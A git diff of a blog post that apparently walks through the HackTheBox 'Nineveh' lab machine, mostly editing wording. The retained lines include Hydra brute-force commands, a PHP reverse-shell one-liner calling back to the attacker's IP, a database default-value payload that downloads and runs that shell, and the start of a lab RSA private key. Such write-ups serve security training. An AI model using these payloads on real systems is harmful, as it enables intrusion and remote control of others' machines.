@@ -83,7 +83,7 @@ When you try to login with a name that doesn't exist (for example v3ded) you wil
 
 <img src="/img/blog/htb-nineveh/htb-nineveh-03.png">
 
-The login page is telling us which users exist and which do not! Isn't that awesome? After confirming that the *admin* username is correct I start a bruteforce attack via Hydra.
+The login page is telling us which users exist and which do not! After confirming that the *admin* username is correct I start a bruteforce attack via Hydra.
 ```console
 root@EdgeOfNight:~# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V
 
@@ -180,7 +180,7 @@ The script will store the sqlite database in the same directory as phpliteadmin.
 <?php phpinfo()?>
 ```
 
-Fortunately for me I've encountered same exploit once already in one of my other blogs - **[zico2]**(https://v3ded.github.io/ctf/zico2.html). It's a lengthy process of creating a database which is then miss-translated into php code that gets executed on a target server. But for all of this to work we need to be authenticated first! Fire our good old hydra again :-).
+Fortunately for me I've encountered same exploit once already in one of my other blogs - [zico2](https://v3ded.github.io/ctf/zico2.html). It's a lengthy process of creating a database which is then miss-translated into php code that gets executed on a target server. But for all of this to work we need to be authenticated first! Fire our good old hydra again :-).
 
 ```console
 root@EdgeOfNight:~# hydra 10.10.10.43 -l whatever -P /usr/share/wordlists/rockyou.txt.gz https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -s 443
@@ -221,7 +221,7 @@ There are many methods one can choose in order to compromise the application, bu
 
 * Make our own **.txt** backdoor file inside */var/www/html* with `<?php $sock=fsockopen("YOUR IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>` as the content 
 * Start apache2 - `/etc/init.d/apache2 start`
-* Make the target download (wget) our **.txt file, save it as **.php** and run it
+* Make the target download (wget) our **.txt** file, save it as **.php** and run it
 
 > Note: If you save the file as **.php** it would get activated on your own server when you wget it later on - **be careful about it**. That's why we save it as **.txt** and output it to **.php**.
 
@@ -233,7 +233,7 @@ Click on our newly created database under *Change Database* and add a table insi
 
 <img src="/img/blog/htb-nineveh/htb-nineveh-10.png">
 
-Name the field whatever we wish, set it as text type, put `<?php system("wget YOURIP/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>` into the default value & click create. This should create a new table with our exploit. *The default value script plays a huge role here as it is used to download our main php reverse shell.*
+Name the field whatever we wish, set it as text type, put `<?php system("wget YOURIP/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>` into the default value & click create. This should create a new table with our exploit. ***The default value script plays a huge role here as it is used to download our main php reverse shell.***
 
 <img src="/img/blog/htb-nineveh/htb-nineveh-11.png">
 
@@ -343,8 +343,8 @@ This is a reference to [port knocking](https://en.wikipedia.org/wiki/Port_knocki
 root@EdgeOfNight:~# nmap -Pn --host-timeout 201 --max-retries 0 -p 571,290,911 10.10.10.43
 ```
 
-If you nmap the target one more time you will notice that SSH is open. Now we just need the password for SSH... Hydra again? No! Finding the key is tricky - you need to run `strings` command on 
-`/var/www/ssl/secure_notes/nineveh.png` which will give you a private RSA key for user amrois.
+If you nmap the target after the knock you will notice that SSH is open. Now we just need the password for SSH... Hydra again? No! Finding the key is tricky - you need to run `strings` command on 
+`/var/www/ssl/secure_notes/nineveh.png`.
 ```console
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
